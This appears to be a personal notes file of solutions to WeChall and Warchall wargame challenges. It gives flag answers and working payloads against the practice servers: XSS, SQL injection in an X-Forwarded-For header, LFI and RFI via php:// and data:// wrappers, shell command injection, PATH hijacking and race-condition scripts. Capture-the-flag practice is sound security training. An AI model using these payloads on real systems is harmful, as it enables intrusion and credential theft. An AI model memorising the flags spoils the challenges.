### bill for Bill (Cracking, Storyline)

```
passwordsuxx
```


### Trivia (Research, Fun)
Google it


### PHP 0816 (Exploit, PHP)
http://www.wechall.net/challenge/php0816/code.php?mode=hl&src=solution.php

```
AnotherCodeflowMistake
```


### Quangcurrency (Exploit)
Competition conditions

```py
import requests
import threading
import lxml.html
import re

cookie = {'WC': '10471295-40857-YcVFssDdDsopRpYF'}


def click():
    requests.get('http://www.wechall.net/challenge/quangcurrency/click.php', cookies=cookie)


def buy():
    requests.get('http://www.wechall.net/challenge/quangcurrency/buy.php', cookies=cookie)


r = re.compile(r'\w+: (\d+)')
while True:
    t1 = threading.Thread(target=click)
    t2 = threading.Thread(target=buy)

    t1.start()
    t2.start()
    t1.join()
    t2.join()

    text = requests.get('http://www.wechall.net/challenge/quangcurrency/stats.php', cookies=cookie).text
    d = lxml.html.document_fromstring(text)
    msg = d.xpath('//div[@class=\'box_c\']')[0]
    a, b, c = r.findall(msg.text_content())
    print 'money: %s, click: %s' % (a, b)
    print 'get %s item ' % c

    if int(c) >= 10:
        break

    if int(a) < 1000 or int(b) >= 50:
        print 'reset'
        requests.get('http://www.wechall.net/challenge/quangcurrency/buy.php', cookies=cookie)
```


### Yourself PHP (PHP, Exploit, XSS)
$_SERVER['PHP_SELF']

```
http://www.wechall.net/challenge/yourself_php/index.php/"><script>alert(1);</script>
```


### The Guestbook (Exploit, PHP, MySQL)
```php
function gbook_getIP()
{
	if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		return $_SERVER['HTTP_X_FORWARDED_FOR'];
	} elseif (isset($_SERVER['HTTP_VIA'])) { 
		return $_SERVER['HTTP_VIA'];
	} else {
		return $_SERVER['REMOTE_ADDR'];
	}
}
```

X-Forwarded-For: 1.1.1.1',(select gbu_password from gbook_user where gbu_name='admin')) #

```curl
curl -b cookie.file -c cookie.file -X POST -d "username=Ranger" -d "password=********" -d "login=Login" https://www.wechall.net/login

curl -b cookie.file -c cookie.file --header "X-Forwarded-For: 1.1.1.1',(select gbu_password from gbook_user where gbu_name='admin')) #" -d "message=test&sign=Sign Guestbook" -X POST http://www.wechall.net/challenge/guestbook/index.php
```

```
TheBrownFoxAndTheLazyDog
```


### Crappyshare (Exploit, PHP)
http://www.wechall.net/challenge/crappyshare/crappyshare.php

Upload By URL: file://solution.php


```
ICaNSeEcLeArLyNoW
```


### Paranoid (Stegano)
In Captcha ?


### Training: Bacon Returns (Stegano, Encoding, Crypto, Training)
ref: http://blog.chrstm.com/2017/05/11/WeChall/

you can read the hidden message so i will tell you the solution which is twelve random letters hogiinnsrdsp

```
hogiinnsrdsp
```


### Tracks (HTTP)
modify cookie VOTE and WC?

Check If-None-Match and Etag in header


### Training: RegexMini (Training, Regex)
if (!preg_match('/^[a-zA-Z]{1,16}$/', $_POST['username'])) { ... }

```
curl -b cookie.file -c cookie.file -X POST -d "username=Ranger" -d "password=********" -d "login=Login" http://www.wechall.net/login

curl -b cookie.file -c cookie.file -d "username=AAAAAAAAAAAAAAAA%0A&submit=Submit" -X POST http://www.wechall.net/challenge/training/regex2/index.php
```


### Identity (Realistic, Research)
whois?

Firstname,Lastname,Street,House,ZIP,City,HomePhone separated by commas.


### Burning Fox (Cracking)
ref: https://github.com/CyrilP/wechall

```
ThinKingOutSideTheBox
```


### Inka (Logic, Stegano, Encoding, Coding)
YouTube hint: Killing In the Name ?


### Choose your Path (Linux, Exploit, Warchall)
point => snprintf(buf, BUFSIZE, "/usr/bin/wc -c %s 2>/dev/null", filename);

cd /home/level/10/

./charp "solution.txt & cat solution.txt > ~/level10.txt"

```
LameAndEasyButMeh
```


### Choose your Path II (Linux, Exploit, Warchall)
point => snprintf(buf, BUFSIZE, "wc -c '%s' 2>/dev/null", escaped_name);

```
export PATH=~/bin:$PATH

cat ~/bin/wc
cat /home/level/11/solution.txt > ~/level11.txt

/home/level/11/charp2
```

```
YourP4thHasBeenCh0sen
```


### Py-Tong (Exploit, Python, Warchall)
race condition

1. FIFO Way

mkfifo p

echo "hi" > p

echo "hello" > p

2. Using bash change file content (work for pytong2)
```
#/bin/bash

i=1
while [ 1 ]
do
    i=$((i+1))
    echo $i > /home/user/ranger/p
done
```

```
KnowYourFilesChiller
```


### Warchall: Live LFI (Linux, Exploit, Warchall)
http://lfi.warchall.net/?lang=php://filter/convert.base64-encode/resource=solution.php

```
SteppinStones42Pie
```


### Warchall: Live RFI (Linux, Exploit, Warchall)
```py
import requests

params = {
    "lang": "data://text/plain,<?php echo `cat solution.php` ?>"
}

r = requests.get("http://rfi.warchall.net/index.php", params=params, verify=False)
print r.content
```

```
Low_H4NGING_Fruit
```


### HOST me (PHP, HTTP)
```
GET http://www.wechall.net/challenge/space/host_me/index.php HTTP/1.1
Host: localhost
Cookie: WC=********
```


### QMine (Java, Special)

Download: http://www.wechall.net/challenge/quangntenemy/QMine/qmine-o.jar

Try Java Decompiler

Congratulations, you win! The secret solution might be Kamekameha!

But Kamekameha is not answer...

```
```


### Warchall: Live RCE (PHP, Exploit, Warchall)
CVE-2012-1823（PHP-CGI RCE）

ref: https://www.trustwave.com/Resources/SpiderLabs-Blog/PHP-CGI-Exploitation-by-Example/

```
StrongGard_6_3
```


### Training: Net Ports (HTTP, Coding)
```
curl -b cookie.file -c cookie.file -X POST -d "username=Ranger" -d "password=********" -d "login=Login" https://www.wechall.net/login

curl -b cookie.file -c cookie.file 'http://www.wechall.net/challenge/training/net/ports/index.php' --local-port 42
```